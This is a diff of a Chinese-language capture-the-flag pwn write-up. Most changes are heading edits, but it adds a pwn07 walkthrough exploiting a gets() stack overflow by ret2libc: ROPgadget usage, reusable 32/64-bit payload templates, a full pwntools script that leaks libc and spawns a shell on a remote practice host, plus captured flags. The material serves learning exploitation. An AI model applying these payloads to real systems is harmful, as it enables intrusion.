@@ -212,7 +212,7 @@ io.interactive()
 
 ## ADWorld
 
-#### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
+### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
 
 先`file ./get_shell`查看文件类型再`checksec --file=get_shell`检查一下文件保护情况。`nc`进去`ls`后发现可以直接`cat flag`，从而得到`cyberpeace{307531652bd497aefcfef07598c97cd3}`。
 
@@ -239,7 +239,7 @@ io.interactive()
 
 ------
 
-#### [hello_pwn](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5052&page=1)
+### [hello_pwn](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5052&page=1)
 
 先`file ./hello_pwn`查看文件类型再`checksec --file=hello_pwn`检查一下文件保护情况。
 
@@ -263,7 +263,7 @@ io.interactive()
 
 ------
 
-#### [level0](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5053)
+### [level0](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5053)
 
 先`file ./level0`查看文件类型再`checksec --file=level0`一下文件保护情况。
 
@@ -304,7 +304,7 @@ io.interactive()
 
 ------
 
-#### [level2](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5055)
+### [level2](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5055)
 
 先`file ./level2`查看文件类型再`checksec --file=level2`检查了一下文件保护情况。
 
@@ -361,7 +361,7 @@ io.interactive()
 
 ## CTFShow
 
-#### pwn02
+### pwn02
 
 先`file ./stack`查看文件类型再`checksec --file=stack`检查一下文件保护情况。
 
@@ -389,7 +389,7 @@ io.interactive()
 
 ------
 
-#### pwn05
+### pwn05
 
 先`file ./pwn05`查看文件类型再`checksec --file=pwn05`检查一下文件保护情况。
 
@@ -430,7 +430,7 @@ io.interactive()
 
 ------
 
-#### pwn06
+### pwn06
 
 先`file ./pwn06`查看文件类型和`checksec --file=pwn06`检查一下文件保护情况。
 
@@ -473,7 +473,7 @@ io.interactive()
 
 ------
 
-#### ret2text
+### ret2text
 
 先`file ./ret2text`查看文件类型再`checksec --file=ret2text`检查了一下文件保护情况。
 
@@ -527,7 +527,7 @@ io.interactive()
 
 ------
 
-#### pwn03
+### pwn03
 
 先`file ./pwn03`查看文件类型再`checksec --file=pwn03`检查了一下文件保护情况。
 
@@ -541,11 +541,13 @@ io.interactive()
 
 ![](https://paper.tanyaodan.com/CTFShow/pwn03/3.png)
 
-双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x9`个字节占满`buf`变量，然后再加上`r`的`4`个字节。
+双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x9`个字节占满`s`变量，然后再加上`r`的`4`个字节。
 
 ![](https://paper.tanyaodan.com/CTFShow/pwn03/4.png)
 
 在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。
+
+编写`Python`代码即可得到`ctfshow{c7611c91-203e-47de-ac92-e0f850aa9135}`。
 
 ```python
 from pwn import *
@@ -580,6 +582,88 @@ io.interactive()
 ```
 
 ![](https://paper.tanyaodan.com/CTFShow/pwn03/5.png)
+
+------
+
+### pwn07
+
+先`file ./pwn07`查看文件类型再`checksec --file=pwn07`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn07/1.png)
+
+用`IDA Pro 64bit`打开附件`pwn07`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn07/2.png)
+
+双击`welcome()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0xc`，即可用栈大小只有`12`字节，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn07/3.png)
+
+双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0xc`个字节占满`s`变量，然后再加上`r`的`4`个字节。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn07/4.png)
+
+有没有发现这题`pwn07`和上面的`pwn03`很像？没错，这简直就是`pwn03`的`64`位版本，不过在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。
+
+```bash
+ROPgadget --binary ./pwn07 --only "pop|ret"
+```
+
+![](https://paper.tanyaodan.com/CTFShow/pwn07/5.png)
+
+解题思路都是：在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。这种类型的题还是有一定套路的：
+
+```python
+e = ELF('pwn')
+# 获取32位版本的got表中的xx函数真实地址,再根据libc中xx函数的偏移地址来算出libc的基址地址
+payload = b'a'*offset + p32(e.plt['xx']) + p32(ret_address) + p32(e.got['xx'])
+# 根据libc的基址地址和偏移地址算出system()和'/bin/sh'的真实地址后,构造32位版本的shellcode
+payload = b'a'*offset + p32(system_address) + p32(0) + p32(bin_sh_address) #p32(0xdeadbeef)或p32(0)或b'a'*4
+
+# 获取64位版本的got表中的xx函数真实地址,再根据libc中xx函数的偏移地址来算出libc的基址地址
+payload = b'a'*offset + p64(pop_rdi) + p64(e.got['xx']) + p64(e.plt['xx']) + p64(ret_address)
+# 根据libc的基址地址和偏移地址算出system()和'/bin/sh'的真实地址后,构造64位版本的shellcode
+payload = b'a'*offset + p64(ret_address) + p64(pop_rdi) + p64(bin_sh_address)
+```
+
+编写`Python`代码即可得到`ctfshow{03a97f04-a802-4c2e-a013-b86a120f034f}`。
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+context(arch='amd64', os='linux', log_level='debug')
+# io = process('pwn07')
+io = remote('pwn.challenge.ctf.show', 28199)
+e = ELF('pwn07')
+puts_plt = e.plt['puts']
+log.success('puts_plt => %s' % hex(puts_plt))
+puts_got = e.got['puts']
+log.success('puts_got => %s' % hex(puts_got))
+pop_rdi = 0x4006e3 # ROPgadget --binary ./pwn07 --only "pop|ret"
+main_address = e.symbols['main']
+log.success('main_address => %s' % hex(main_address))
+payload = b'a'*0xc + b'fuckpwn!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
+io.sendline(payload)
+io.recvline()
+puts_address = io.recv().strip(b'\n')
+log.success('io.recv().strip(b\\n\') => %s', puts_address)
+puts_address = u64(puts_address.ljust(8, b'\x00'))  # 地址只有6bytes, 补到8位才能unpack
+log.success('puts_address => %s' % hex(puts_address))
+libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.31-8_amd64
+libcbase = puts_address - libc.dump('puts') # libc的基址=puts()函数地址-puts()函数偏移地址
+log.success('libcbase_address => %s' % hex(libcbase))
+system_address = libcbase + libc.dump('system')
+log.success('system_address => %s' % hex(system_address)) # system()函数的地址=libc的基址+system()函数偏移地址
+bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址
+log.success('bin_sh_address => %s' % hex(bin_sh_address))
+pop_ret = 0x4004c6 # ROPgadget --binary ./pwn07 --only "pop|ret"
+payload = b'a'*0xc + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/CTFShow/pwn07/6.png)
 
 ------
 
